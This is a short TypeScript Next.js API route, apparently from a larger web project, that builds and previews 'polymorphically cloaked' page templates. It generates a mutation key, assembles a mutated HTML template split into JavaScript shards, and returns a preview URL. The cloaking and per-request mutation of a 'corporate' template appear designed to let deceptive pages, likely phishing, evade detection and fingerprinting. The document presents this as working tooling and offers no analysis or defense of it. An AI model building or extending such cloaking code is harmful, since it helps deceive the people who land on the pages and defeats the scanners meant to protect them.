/**
 * Link Preview API (with Polymorphic Cloaking)
 * Phase 5.8: Shows preview with polymorphism applied
 */

import { NextRequest, NextResponse } from 'next/server'
import { buildMutatedTemplate } from '@/mutator/buildEngine'
import { resolveMutation } from '@/lib/mutations/mutationTracker'
import { getCachedSettings } from '@/lib/adminSettings'

export async function GET(request: NextRequest) {
  try {
    const templateName = request.nextUrl.searchParams.get('template') || 'corporate'
    const mutationKey = request.nextUrl.searchParams.get('mutationKey')
    
    const settings = getCachedSettings()
    
    // Check if polymorphic cloaking is enabled
    if (settings.security?.enablePolymorphicCloaking === false) {
      return NextResponse.json({
        template: templateName,
        mutationKey: null,
        message: 'Polymorphic cloaking disabled',
      })
    }
    
    // Generate or use provided mutation key
    let key = mutationKey
    if (!key) {
      key = await resolveMutation(request as any, false, false)
    }
    
    // Build mutated template
    const { htmlPath, jsShards } = await buildMutatedTemplate(templateName, key)
    
    return NextResponse.json({
      template: templateName,
      mutationKey: key,
      htmlPath,
      jsShards,
      previewUrl: `/api/mutated-template?key=${key}&template=${templateName}`,
    })
  } catch (error) {
    return NextResponse.json(
      { error: 'Failed to generate preview' },
      { status: 500 }
    )
  }
}






